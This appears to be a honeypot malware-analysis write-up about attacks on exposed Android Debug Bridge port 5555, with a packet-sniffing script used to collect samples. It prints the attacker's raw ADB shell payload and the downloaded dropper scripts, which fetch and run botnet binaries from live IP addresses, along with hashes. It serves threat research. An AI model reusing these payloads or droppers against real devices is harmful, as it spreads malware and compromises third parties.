@@ -1,0 +1,132 @@
+Android Debug Bridge(ADB) is a network utility used by many IOT devices. ADB listens on port 5555 and can be vulnerable if remained unpatched, giving an attacker remote code execution. I have observed that the attacker will connect to TCP port 5555, and send the payload below in a tcp PSH,ACK. 
+
+CNXN\x00\x00\x00\x01\x00\x00\x04\x00\x1b\x00\x00\x00M\n\x00\x00¼±§±host::features=cmd,shell_v2
+
+
+After this the attacker sends another payload. Below is an example of a tcp payload used to exploit an ADB server. This is sent using another PSH,ACK.
+
+OPENX\x01\x00\x00\x00\x00\x00\x00t\x00\x00\x004#\x00\x00°¯º±shell:cd /data/local/tmp/; busybox wget http://185.216.71.65/w.sh; sh w.sh; curl http://185.216.71.65/c.sh; sh c.sh\x00
+
+
+From this we can tell that the payload aims to download scripts from malicous servers and execute them on the infected system. Using a small python script with scapy, we can grab the url from the data and download these scripts for inspection
+
+
+#!/usr/bin/python3
+from scapy.all import *
+import requests
+import subprocess
+def filterer(pktin):
+   return pktin.haslayer(TCP) and pktin[TCP].flags.value==24 and pktin[IP].dst=='10.0.0.21' and b'http://' in pktin[Raw].load
+def processor(pktin):
+   load=pktin[Raw].load
+   while True:
+      try:
+         ptr=load.index(b'http://')
+         url=load[ptr:load[ptr:].index(b' ')+ptr]
+         load=load[load[ptr:].index(b' ')+ptr:]
+         
+         print(url)
+         ip=url[7:url[7:].index(b'/')+7].decode('utf-8')
+         ip2='10.0.0.21'
+         subprocess.run(["iptables", "-I", "INPUT", "1", "-d", ip2, "-s", ip, "-i", "eth0", "-p", "tcp", "-m", "tcp", "--sport", "80", "-m", "state", "--state", "ESTABLISHED", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-I", "OUTPUT", "1", "-s", ip2, "-d", ip, "-o", "eth0", "-p", "tcp", "-m", "tcp", "--dport", "80", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-I", "INPUT", "1", "-d", ip2, "-s", ip, "-i", "eth0", "-p", "tcp", "-m", "tcp", "--sport", "443", "-m", "state", "--state", "ESTABLISHED", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-I", "OUTPUT", "1", "-s", ip2, "-d", ip, "-o", "eth0", "-p", "tcp", "-m", "tcp", "--dport", "443", "-j", "ACCEPT"])
+         webdata=requests.get(url.rstrip(b';').decode('utf-8')).content
+         subprocess.run(["iptables", "-D", "INPUT", "-d", ip2, "-s", ip, "-i", "eth0", "-p", "tcp", "-m", "tcp", "--sport", "80", "-m", "state", "--state", "ESTABLISHED", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-D", "OUTPUT", "-s", ip2, "-d", ip, "-o", "eth0", "-p", "tcp", "-m", "tcp", "--dport", "80", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-D", "INPUT", "-d", ip2, "-s", ip, "-i", "eth0", "-p", "tcp", "-m", "tcp", "--sport", "443", "-m", "state", "--state", "ESTABLISHED", "-j", "ACCEPT"])
+         subprocess.run(["iptables", "-D", "OUTPUT", "-s", ip2, "-d", ip, "-o", "eth0", "-p", "tcp", "-m", "tcp", "--dport", "443", "-j", "ACCEPT"])
+         wri=open('/home/pi/maldat.txt','ab')
+         wri.write(webdata)
+         wri.write(b'---------------------')
+         wri.close()
+      except ValueError:
+         break
+sniff(iface='eth0', store=0,prn=processor,lfilter=filterer)
+
+Below is the output of this script. Unfortunately I lost the malware for my first observation and forgot to get hashes. After running this again i got two more attacks. I have the hashes
+b'http://85.209.134.231/w.sh;'
+b'http://85.209.134.231/c.sh;'
+b'http://85.209.134.231/wget.sh
+b'http://85.209.134.231/tamkjll.arm;''1658efe515e7e51128e8fc8e66d8821b5e307b52208de2317b8b919b53bf7c13'
+b'http://85.209.134.231/tamkjll.arm5;''3f13d2051c1c30ec7b0e2f55bbf5fcce1c2abc25c895247d55ec0fb8666ab46e'
+b'http://85.209.134.231/tamkjll.arm6;''3a7f2e0c4eddea57ab8c9c59f7d402689882b627ddef4c8d883ccd7a45353a06'
+b'http://85.209.134.231/tamkjll.arm7;''96c2725aeb556c6cbaecd6cbf10cb84c93aa4c740a5fae8d77416035adb855ce'
+b'http://85.209.134.231/tamkjll.sh4;''ce713ef020df7c288f0a971245582e25272227fe1c68ace5b09a7da6d4af06ce'
+b'http://85.209.134.231/arc;''c0c3c8b698e3278315398dc673f7a6404f0df8dbe1d870db6f43b10f583159ae'
+b'http://85.209.134.231/tamkjll.mips;'13981c92720d9ef10739696b7b5aa667200301087f0cb380961afbfa1c7895fa'
+b'http://85.209.134.231/tamkjll.mpsl;''9caf88eae9addf2cec0643404e6661d65090083cee97a048fa3db5fece5d8232'
+b'http://85.209.134.231/tamkjll.sparc;''8da7c22527482f7e4849bc7ffd6e732e558f38c45549e83e6412279553098d93'
+b'http://85.209.134.231/tamkjll.x86_64;''8cb4263eda58289583ba8d14a7f6c6e053639b3b4f29fd27defa1c88ea74bc2a'
+b'http://85.209.134.231/tamkjll.x86;''8460e1b09351b7d5774af183fe62985e59d19090c86dcdccabf2ec79d76fb4e4'
+
+
+
+Below is the downloaded scripts from w.sh and c.sh
+---------w.sh-----------
+busybox wget http://85.209.134.231/tamkjll.arm; chmod 777 tamkjll.arm; ./tamkjll.arm android
+busybox wget http://85.209.134.231/tamkjll.arm5; chmod 777 tamkjll.arm5; ./tamkjll.arm5 android
+busybox wget http://85.209.134.231/tamkjll.arm6; chmod 777 tamkjll.arm6; ./tamkjll.arm6 android
+busybox wget http://85.209.134.231/tamkjll.arm7; chmod 777 tamkjll.arm7; ./tamkjll.arm7 android
+busybox wget http://85.209.134.231/tamkjll.sh4; chmod 777 tamkjll.sh4; ./tamkjll.sh4 android
+busybox wget http://85.209.134.231/tamkjll.arc; chmod 777 tamkjll.arc; ./tamkjll.arc android
+busybox wget http://85.209.134.231/tamkjll.mips; chmod 777 tamkjll.mips; ./tamkjll.mips android
+busybox wget http://85.209.134.231/tamkjll.mpsl; chmod 777 tamkjll.mpsl; ./tamkjll.mpsl android
+busybox wget http://85.209.134.231/tamkjll.sparc; chmod 777 tamkjll.sparc; ./tamkjll.sparc android
+busybox wget http://85.209.134.231/tamkjll.x86_64; chmod 777 tamkjll.x86_64; ./tamkjll.x86_64 android
+busybox wget http://85.209.134.231/tamkjll.x86; chmod 777 tamkjll.x86; ./tamkjll.x86 android
+
+rm $0
+----------c.sh-----------
+curl http://85.209.134.231/tamkjll.arm; chmod 777 tamkjll.arm; ./tamkjll.arm android
+curl http://85.209.134.231/tamkjll.arm5; chmod 777 tamkjll.arm5; ./tamkjll.arm5 android
+curl http://85.209.134.231/tamkjll.arm6; chmod 777 tamkjll.arm6; ./tamkjll.arm6 android
+curl http://85.209.134.231/tamkjll.arm7; chmod 777 tamkjll.arm7; ./tamkjll.arm7 android
+curl http://85.209.134.231/tamkjll.sh4; chmod 777 tamkjll.sh4; ./tamkjll.sh4 android
+curl http://85.209.134.231/tamkjll.arc; chmod 777 tamkjll.arc; ./tamkjll.arc android
+curl http://85.209.134.231/tamkjll.mips; chmod 777 tamkjll.mips; ./tamkjll.mips android
+curl http://85.209.134.231/tamkjll.mpsl; chmod 777 tamkjll.mpsl; ./tamkjll.mpsl android
+curl http://85.209.134.231/tamkjll.sparc; chmod 777 tamkjll.sparc; ./tamkjll.sparc android
+curl http://85.209.134.231/tamkjll.x86_64; chmod 777 tamkjll.x86_64; ./tamkjll.x86_64 android
+curl http://85.209.134.231/tamkjll.x86; chmod 777 tamkjll.x86; ./tamkjll.x86 android
+
+rm $0
+---------wget.sh------------------------
+wget http://85.209.134.231/tamkjll.arm5; chmod 777 tamkjll.arm5; ./tamkjll.arm5 android
+wget http://85.209.134.231/tamkjll.arm6; chmod 777 tamkjll.arm6; ./tamkjll.arm6 android
+wget http://85.209.134.231/tamkjll.arm7; chmod 777 tamkjll.arm7; ./tamkjll.arm7 android
+wget http://85.209.134.231/tamkjll.sh4; chmod 777 tamkjll.sh4; ./tamkjll.sh4 android
+wget http://85.209.134.231/tamkjll.arc; chmod 777 tamkjll.arc; ./tamkjll.arc android
+wget http://85.209.134.231/tamkjll.mips; chmod 777 tamkjll.mips; ./tamkjll.mips android
+wget http://85.209.134.231/tamkjll.mpsl; chmod 777 tamkjll.mpsl; ./tamkjll.mpsl android
+wget http://85.209.134.231/tamkjll.sparc; chmod 777 tamkjll.sparc; ./tamkjll.sparc android
+wget http://85.209.134.231/tamkjll.x86_64; chmod 777 tamkjll.x86_64; ./tamkjll.x86_64 android
+wget http://85.209.134.231/tamkjll.x86; chmod 777 tamkjll.x86; ./tamkjll.x86 android
+
+rm $0
+
+
+
+
+
+b'http://192.133.40.248/w.sh;'
+b'http://192.133.40.248/c.sh;'
+b'http://192.133.40.248/wget.sh
+b'http://192.133.40.248/arm;''f7140a46ad4cf41054f2ce615ce4a860c28d9c4e511a420b81eb4077bec6c4b8'
+b'http://192.133.40.248/arm5;''ed81fc98b536f4202c67856dc250f0097ae67b4eeda1f70e025a23e7ae289746'
+b'http://192.133.40.248/arm6;''b4ea8c50a57182f75016284a38defe685a78e43f1b4c765ec3570b58fb164d3c'
+b'http://192.133.40.248/arm7;''54fe32ff60b3dc429eee8e91c7d2b899371759e4f51fc3669f2628665d68d888'
+b'http://192.133.40.248/m68k;''679d591ca0020e9072eaef3d8a329c394045c94de4e5e0d46f15ccfd0fdea611'
+b'http://192.133.40.248/mips;''e6ebea295532948a17e4380f19425de942d03c44ae6110dcef5b2ed73d45e31a'
+b'http://192.133.40.248/mpsl;'f4adb2837c7fa6e2d68e36888e415cda45695e0ce38f56907e6d7e9c938e13b1'
+b'http://192.133.40.248/ppc;''fec53533f03dca75e9391c0c50abbd25ec59328a5fcfe3a9333e72e07a521639'
+b'http://192.133.40.248/sh4''85bff0f3b955af565323e423c2fe679c44c434c604a6a691dd16c51dce3b1970'
+b'http://192.133.40.248/spc;''0300015a1eb233815e72445563877b23c931b56e2e33a263cc7ed6583415b9cc'
+b'http://192.133.40.248/x86;''ea7ae4a34e05c266a30405c803bdbd8abea91deff860c2dc2806ff50217c0d3a'
+b'http://192.133.40.248/x86_64''11c254bf2dc96a793633683c4b2ba8972bbd83c464b100aa77c876ccbf202ebc'
+
+
+
+
+Upon some research online I found from https://www.trendmicro.com/en_us/research/18/g/open-adb-ports-being-exploited-to-spread-possible-satori-variant-in-android-devices.html that they found shell scripts that would download a binary to be executed with a special parameter. This binary spawns a process to spread malware as a worm. The binary then connects to the attacker and recieves a payload. This payload conatained a list of of targets to attack which would then be attacked by the malware subprocess, "possibly as part of a DDoS attack." Of course with remote code execution anything is possible and this is just one example of compromise.
